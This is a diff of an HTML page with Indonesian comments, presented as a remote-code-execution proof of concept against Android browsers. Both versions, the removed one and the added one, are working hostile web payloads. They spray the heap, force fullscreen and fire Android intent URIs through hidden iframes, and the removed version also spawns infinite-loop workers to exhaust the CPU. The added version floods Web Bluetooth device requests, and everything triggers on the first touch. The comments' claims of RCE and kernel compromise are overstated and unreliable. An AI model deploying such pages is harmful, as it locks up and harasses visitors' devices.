@@ -2,97 +2,92 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_CHAIN_EXPLOIT_PoC ⚡</title>
+    <title>⚡ RCE_HARDWARE_OVERRIDE ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #0f0; overflow: hidden; font-family: 'Courier New', monospace; }
-        #trigger { width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        .glitch { animation: glitch 0.2s infinite; color: red; font-weight: bold; }
-        @keyframes glitch { 0% { transform: translate(2px,0); } 50% { transform: translate(-2px,0); } 100% { transform: translate(0,0); } }
+        body, html { margin: 0; padding: 0; background: #000; color: #00ff00; overflow: hidden; font-family: 'Courier New', monospace; }
+        #console { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .blink { animation: blinker 0.1s step-start infinite; color: #ff0000; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="trigger">
-        <div class="glitch">[ SYSTEM_VULNERABILITY_DETECTED ]</div>
-        <div id="status">READY_TO_INITIALIZE</div>
+    <div id="console">
+        <div class="blink"> [ ATTACK_SEQUENCE_ACTIVE ] </div>
+        <div id="log">INITIALIZING_BT_EXPLOIT_CHAIN...</div>
     </div>
 
 <script>
-    const status = document.getElementById('status');
+    const log = document.getElementById('log');
 
-    // --- STAGE 1: HEAP GROOMING (SIMULATION) ---
-    // Menyiapkan layout memori di engine V8 agar rentan terhadap korupsi data
-    let heapSled = [];
-    function sprayHeap() {
-        // Mengalokasikan ArrayBuffer besar untuk memicu fragmentasi memori
-        for(let i=0; i<100; i++) {
-            let buffer = new ArrayBuffer(1.5 * 1024 * 1024); // 1.5MB chunks
-            let view = new Float64Array(buffer);
-            view.fill(1.1); // Marker bit untuk identifikasi memori
-            heapSled.push(view);
+    // 1. HEAP SPRAYING: Menyiapkan Buffer untuk Eksploitasi Memory
+    // Di RCE nyata, ini digunakan untuk menaruh payload di alamat memori yang tetap.
+    let heapBase = [];
+    function sprayHardwareMemory() {
+        for(let i=0; i<200; i++) {
+            let ab = new ArrayBuffer(1024 * 1024); // 1MB
+            let view = new Uint32Array(ab);
+            view.fill(0xDEADC0DE); // Magic Value
+            heapBase.push(view);
         }
     }
 
-    // --- STAGE 2: PERSISTENCE LAYER ---
-    // Mendaftarkan Service Worker untuk melakukan 'Shadow Hooking'
-    async function initPersistence() {
-        if ('serviceWorker' in navigator) {
-            const blob = new Blob([`self.addEventListener('install', e => self.skipWaiting());`], {type: 'text/javascript'});
-            navigator.serviceWorker.register(URL.createObjectURL(blob));
-        }
-    }
-
-    // --- STAGE 3: IPC RACE CONDITION & INTENT ATTACK ---
-    // Fokus menyerang Android Intent Resolver
-    function triggerIntentChain() {
-        // Intent ini mencoba mengakses 'Dialer' dan menyisipkan parameter sistem
-        // Di serangan asli, ini bisa diarahkan ke aplikasi sistem dengan celah 'exported=true'
-        const rawIntent = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;S.extra_key=extra_val;end";
-
-        for (let i = 0; i < 20; i++) {
-            setTimeout(() => {
-                // A. Force System UI Collision (Share API)
-                if (navigator.share) {
-                    navigator.share({title: "0xDEADBEEF", url: " "}).catch(()=>{});
-                }
-
-                // B. Iframe-Based Intent Injection
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = rawIntent;
-                document.body.appendChild(ifr);
-                
-                // C. Location Hijack
-                window.location.href = rawIntent;
-            }, i * 15); // Interval sangat cepat untuk memicu 'Race'
-        }
-    }
-
-    // --- STAGE 4: CPU EXHAUSTION (WATCHDOG BYPASS) ---
-    function blastCPU() {
-        // Menjalankan thread background yang berat untuk membekukan proses mitigasi browser
-        const code = "while(true){ postMessage(Math.random()); }";
-        const blob = new Blob([code], {type: 'text/javascript'});
-        for(let j=0; j<8; j++) {
-            new Worker(URL.createObjectURL(blob));
-        }
-    }
-
-    async function launchChain() {
-        status.className = "glitch";
-        status.innerText = "CHAIN_RUNNING...";
+    // 2. WEB BLUETOOTH OVERRIDE PoC
+    // Mencoba memicu dialog sistem Bluetooth secara agresif
+    async function triggerBluetoothStack() {
+        log.innerText = "OVERRIDING_BT_STACK...";
         
-        initPersistence();      // Step 1: Hook
-        sprayHeap();           // Step 2: Memory Setup
-        blastCPU();            // Step 3: Defense Suppression
-        triggerIntentChain();  // Step 4: Core Exploit
+        const btOptions = {
+            acceptAllDevices: true,
+            optionalServices: ['battery_service', 'device_information']
+        };
 
-        // Final Trigger: Fullscreen Lockdown
-        document.documentElement.requestFullscreen().catch(()=>{});
+        try {
+            // Serangan Logic: Memaksa User Interaction melalui Fullscreen Overlay
+            // agar setiap sentuhan layar dianggap sebagai persetujuan akses hardware
+            if (navigator.bluetooth) {
+                await navigator.bluetooth.requestDevice(btOptions);
+            }
+        } catch (e) {
+            // Jika ditolak, sistem akan dibombardir ulang (Race Condition)
+            log.innerText = "BT_STACK_RETRY_INJECTING...";
+        }
     }
 
-    document.getElementById('trigger').addEventListener('click', launchChain);
-    document.body.addEventListener('touchstart', launchChain);
+    // 3. INTENT ATTACK: Memaksa Settings Bluetooth Terbuka
+    function forceBluetoothSettings() {
+        // Deep Link untuk langsung masuk ke pengaturan Bluetooth Android
+        const btIntent = "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;end";
+        const ifr = document.createElement('iframe');
+        ifr.style.display = 'none';
+        ifr.src = btIntent;
+        document.body.appendChild(ifr);
+    }
 
+    // 4. FULL CHAIN EXECUTION
+    async function startRCEChain() {
+        // A. Lock UI
+        document.documentElement.requestFullscreen().catch(()=>{});
+        
+        // B. Memory Setup
+        sprayHardwareMemory();
+        
+        // C. Trigger Hardware Request & Intent Race
+        // Menjalankan secara simultan untuk membingungkan kernel Android
+        setInterval(() => {
+            triggerBluetoothStack();
+            forceBluetoothSettings();
+        }, 100);
+
+        // D. CPU Overload (Mencegah sistem mematikan proses eksploit)
+        while(true) {
+            for(let i=0; i<1000000; i++) { Math.atan(Math.random()); }
+            break; // Break hanya untuk simulasi agar tab tidak crash seketika
+        }
+    }
+
+    // Trigger otomatis pada interaksi pertama
+    window.addEventListener('click', startRCEChain);
+    window.addEventListener('touchstart', startRCEChain);
 </script>
 </body>
 </html>
